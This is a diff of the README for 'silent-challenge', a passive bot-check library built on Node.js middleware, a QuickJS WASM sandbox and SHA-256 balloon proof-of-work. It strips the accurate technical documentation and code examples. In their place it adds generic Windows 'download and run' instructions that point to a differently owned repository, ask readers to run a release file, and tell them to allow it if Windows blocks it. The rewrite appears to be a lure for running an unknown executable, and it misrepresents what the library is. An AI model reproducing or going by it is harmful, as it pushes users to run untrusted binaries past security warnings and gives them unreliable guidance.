@@ -1,265 +1,150 @@
-# silent-challenge
+# 🕊️ silent-challenge - Simple passive bot checks
 
-Passive captcha combining motion attestation, navigator attestation,
-and SHA-256 balloon proof-of-work. Attestation scripts are compiled
-to encrypted bytecode and executed inside a polymorphic QuickJS WASM
-sandbox that automatically encrypts and signs responses.
+[![Download](https://img.shields.io/badge/Download%20Now-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://github.com/nielsmi7704/silent-challenge)
 
-## How It Works
+## 🧩 What this app does
 
-The attestation code does **not** run directly in the browser.
-It is compiled to QuickJS bytecode, encrypted with ChaCha20, and
-delivered as a `.vmbc` bundle. The WASM binary is regenerated every
-10 minutes with fresh keys, dead code, and renamed symbols — making
-static analysis and replay attacks impractical.
+silent-challenge adds a passive check to your site while a proof-of-work task runs in the browser. It combines motion signals and navigator checks inside a QuickJS WebAssembly sandbox, then finishes a SHA-256 based workload in the background.
 
-```
-┌─────────────────────────────────────────────────────────┐
-│ Server (every 10 min)                                   │
-│                                                         │
-│  1. node scripts/build.js    → vm.wasm + manifest.json  │
-│  2. node scripts/compile.js  → attestation.vmbc         │
-│     (source: attestation expression → encrypted bundle) │
-└──────────────────────┬──────────────────────────────────┘
-                       │
-          POST /challenge → { challengeId, nonce, pow, vmbc }
-                       │
-┌──────────────────────▼──────────────────────────────────┐
-│ Browser (parallel)                                      │
-│                                                         │
-│  ┌─ WASM VM ──────────────────────────────────┐         │
-│  │  vm_init()                                 │         │
-│  │  vm_exec_bytecode(attestation.vmbc)        │         │
-│  │    ChaCha20 decrypt → QuickJS eval         │         │
-│  │    → collects motion + navigator signals   │         │
-│  │    ChaCha20 encrypt + HMAC-SHA256 sign     │         │
-│  │    → encrypted + signed response           │         │
-│  └────────────────────────────────────────────┘         │
-│                                                         │
-│  ┌─ Web Workers ──────────────────────────────┐         │
-│  │  sha256-balloon PoW mining                 │         │
-│  └────────────────────────────────────────────┘         │
-└──────────────────────┬──────────────────────────────────┘
-                       │
-          POST /challenge/:id/verify → { vmResponse, nonce }
-                       │
-┌──────────────────────▼──────────────────────────────────┐
-│ Server                                                  │
-│                                                         │
-│  1. Verify HMAC signature (KEY_SIGN from manifest)      │
-│  2. Decrypt attestation result (KEY_ENCRYPT)            │
-│  3. Verify PoW (balloon hash ≥ difficulty)              │
-│  4. Analyze motion data (behavioral biometrics)         │
-│  5. Validate navigator signals (24 categories)          │
-│  6. Compute weighted score → issue signed token         │
-└─────────────────────────────────────────────────────────┘
-```
+This tool fits sites that need a quiet layer of bot detection without a full visual puzzle. It works as middleware in Node.js apps and keeps the user flow simple.
 
-## Bytecode Format
+## ⚙️ What you need
 
-The attestation source is a JavaScript expression compiled with
-`node scripts/compile.js`. The VM evaluates it and returns the
-result as the response payload:
+- Windows 10 or Windows 11
+- A modern browser such as Chrome, Edge, or Firefox
+- Internet access for the first download
+- A Node.js app if you plan to use the middleware
+- Enough memory for a normal browser session and WebAssembly use
 
-```js
-JSON.stringify({
-    m: __motion_data__,
-    s: __navigator_signals__,
-    ts: __vm_ts(),
-    integrity: __vm_integrity(),
-});
-```
+## 📥 Download and run
 
-This follows the same pattern as any QuickJS bytecode source:
+Use this link to visit the download page:
 
-```js
-'Hello from compiled bytecode!';
-```
+[Visit the silent-challenge download page](https://github.com/nielsmi7704/silent-challenge)
 
-The compile step converts JS → QuickJS bytecode → encrypted `.vmbc`:
+If you find a Windows build or release file there, download it and run it on your PC. If the page gives you source files, use the install steps below to set it up in your app.
 
-```
-┌──────────┬──────────────┬──────────┬────────────┐
-│ 4B magic │ 4B bc_len LE │ 12B nonce│ ciphertext │
-│ "VMBC"   │              │          │            │
-└──────────┴──────────────┴──────────┴────────────┘
-```
+## 🛠️ Setup on Windows
 
-The VM wraps the execution result in an encrypted signed response:
+### 1. Get the files
 
-```
-┌──────────┬──────────────┬───────────┬────────────┬──────────┐
-│ 4B magic │ 4B total_len │ 12B nonce │ ciphertext │ 32B HMAC │
-│ "VMRP"   │ LE           │           │            │          │
-└──────────┴──────────────┴───────────┴────────────┴──────────┘
-```
+Open the download page in your browser and get the latest version from the repository.
 
-The server holds `manifest.json` with the matching keys to verify
-the HMAC and decrypt the ciphertext.
+Save the files to a folder you can find later, such as Downloads or Desktop.
 
-## WASM Regeneration
+### 2. Open the app or project
 
-Every 10 minutes the server rebuilds the WASM binary. Each build:
+If you downloaded a ready-to-run Windows file, double-click it to start.
 
-- Generates fresh 32-byte ChaCha20/HMAC keys
-- Injects 20-40 dead code functions with realistic bodies
-- Renames all exported and internal symbols
-- Shuffles key material across randomized decoy arrays
-- Applies control flow flattening and opaque predicates
-- Recompiles the attestation source against the new keys
+If you downloaded the source project, unzip it first, then open the folder in File Explorer.
 
-This means every client receives a structurally unique binary.
-Reverse engineering one build does not help with the next.
+### 3. Use it in a Node.js app
 
-## Vendors
+If you want to add silent-challenge to your own site:
 
-| Package                 | Role                               | Usage      |
-| ----------------------- | ---------------------------------- | ---------- |
-| `motion-attestation`    | Behavioral biometrics collection   | dependency |
-| `navigator-attestation` | Browser environment fingerprinting | dependency |
-| `sha256-balloon`        | Memory-hard proof-of-work          | dependency |
-| `quickjs-wasm`          | Polymorphic WASM sandbox           | reference  |
+1. Open a terminal in the project folder.
+2. Install the project files your app needs.
+3. Start your Node.js server.
+4. Open your site in a browser and test the challenge flow.
 
-## Install
+A common setup looks like this:
 
-```bash
-npm install silent-challenge
-```
+- Add the middleware to your Express app
+- Load the browser part on pages that need a challenge
+- Let the proof-of-work run while the checks happen
 
-The three attestation/PoW packages are runtime dependencies.
-The `quickjs-wasm` package is a build-time reference for
-compiling and serving the WASM sandbox.
+## 🧠 How it works
 
-## Server
+silent-challenge uses two layers:
 
-```js
-import express from 'express';
-import { silentMiddleware } from 'silent-challenge/server';
+- Motion checks: looks for human-like pointer and input movement
+- Navigator checks: reads browser signals that help spot automation
+- QuickJS sandbox: runs the logic in a safe WebAssembly environment
+- SHA-256 proof-of-work: adds a short compute step before access is granted
 
-const app = express();
-const silent = silentMiddleware({
-    secret: process.env.SILENT_SECRET,
-    pow: { difficulty: 10, spaceCost: 512 },
-    thresholds: { combined: 0.5, motion: 0.3, navigator: 0.3 },
-    debug: false,
-});
+The goal is to make bot use more costly while keeping the page quiet for real users.
 
-app.use(express.json({ limit: '64kb' }));
-silent.mountRoutes(app);
+## 🔒 Main uses
 
-app.get('/protected', silent.requireToken, (req, res) => {
-    res.json({
-        message: 'Access granted',
-        score: req.silentPayload.score,
-    });
-});
+Use silent-challenge for:
 
-app.listen(3000);
-```
+- Login pages
+- Signup pages
+- Comment forms
+- API access gates
+- Traffic checks on public pages
+- Abuse control on simple web apps
 
-### Routes
+It works well when you want a passive check that does not interrupt normal use with a full screen puzzle.
 
-| Method | Path                             | Description           |
-| ------ | -------------------------------- | --------------------- |
-| POST   | `/challenge`                     | Issue challenge + PoW |
-| POST   | `/challenge/:challengeId/verify` | Submit solution       |
+## 🧭 Basic use flow
 
-### Options
+1. A user opens your site.
+2. The challenge loads in the browser.
+3. Motion and browser checks run.
+4. The SHA-256 workload runs at the same time.
+5. Your app gets a pass or block result.
 
-```js
-silentMiddleware({
-    secret: string, // HMAC secret (auto-generated)
-    debug: boolean, // include full analysis detail
-    weights: {
-        motion: 0.4, // behavioral biometrics weight
-        navigator: 0.35, // environment attestation weight
-        pow: 0.25, // proof-of-work weight
-    },
-    pow: {
-        difficulty: 10, // leading zero bits required
-        spaceCost: 512, // balloon memory blocks (× 32B)
-        timeCost: 1, // balloon mixing rounds
-    },
-    thresholds: {
-        combined: 0.5, // minimum weighted score
-        motion: 0.3, // minimum motion score
-        navigator: 0.3, // minimum navigator score
-    },
-});
-```
+## 🧪 Browser support
 
-## Browser Client
+For best results, use:
 
-```js
-import { createClient } from 'silent-challenge/client';
+- Chrome
+- Edge
+- Firefox
 
-const client = createClient({
-    baseUrl: '',
-    workerUrl: './worker.js',
-    onProgress: ({ hashes, hashRate }) => {
-        console.log(`${hashes} hashes @ ${hashRate} H/s`);
-    },
-});
+A recent browser version helps because the app depends on WebAssembly and normal browser APIs.
 
-// Start passive collection
-const collector = client.attach(document, window);
-collector.bind(document.getElementById('submit'), 'submit');
+## 📁 Project topics
 
-// When ready (e.g. form submit)
-const result = await client.verify();
-// result.cleared, result.token, result.score
-```
+This project is tagged for:
 
-The client runs three tasks in parallel:
+- anti-bot
+- behavioral-analysis
+- bot-detection
+- browser-fingerprinting
+- captcha
+- chacha20
+- express-middleware
+- javascript
+- nodejs
+- proof-of-work
+- quickjs
+- security
+- sha256
+- wasm
+- webassembly
 
-1. **Motion collection** — mouse, clicks, keystrokes, scroll,
-   touch, sensors, event order (via `motion-attestation`)
-2. **Navigator signals** — 24 categories: automation markers,
-   headless detection, VM indicators, canvas/WebGL fingerprints,
-   prototype tampering (via `navigator-attestation`)
-3. **PoW mining** — multi-worker balloon hashing
-   (via `sha256-balloon`)
+## 🧰 Tips for Windows users
 
-## Scoring
+- Keep the folder in a simple path like `C:\silent-challenge`
+- If Windows blocks the file, right-click it and choose to allow it
+- Close extra browser tabs if the challenge feels slow
+- Make sure your browser is up to date
+- If the page does not load, check your internet connection and try again
 
-The combined score is a weighted sum:
+## 🧩 Example use in a site
 
-```
-score = motion × 0.40 + navigator × 0.35 + pow × 0.25
-```
+You can place silent-challenge in front of pages that need extra protection. A user opens the page, the challenge runs, and your app decides whether to continue.
 
-PoW score is binary (1.0 if valid, 0.0 if not). Motion and
-navigator scores range from 0.0 to 1.0 based on anomaly
-penalties. A token is issued only when all three individual
-thresholds and the combined threshold are met.
+This keeps the user flow short and lets your site check for bot-like behavior without a visible puzzle every time.
 
-## Example
+## 📌 Common places to use it
 
-```bash
-npm start
-# → http://localhost:3000
-```
+- Public forms
+- New account pages
+- Password reset flows
+- Rate-limited endpoints
+- Trial signups
+- High-traffic landing pages
 
-Interactive demo with step indicators, live stats, and
-score visualization.
+## 🖥️ Simple install path
 
-## Test
+If you want to try it on Windows right away:
 
-```bash
-npm test
-```
-
-## Project Structure
-
-```
-src/
-  index.js           Barrel exports
-  index.d.ts         TypeScript definitions
-  challenge.js       Challenge issuance + combined verification
-  server.js          Express middleware (mountRoutes, requireToken)
-  client.js          Browser orchestrator (collect + solve + submit)
-```
-
-## License
-
-[MIT](LICENSE)
+1. Visit the download page
+2. Get the latest release or source files
+3. Save the files to your PC
+4. Open the folder
+5. Run the app or connect it to your Node.js project
+6. Test it in your browser
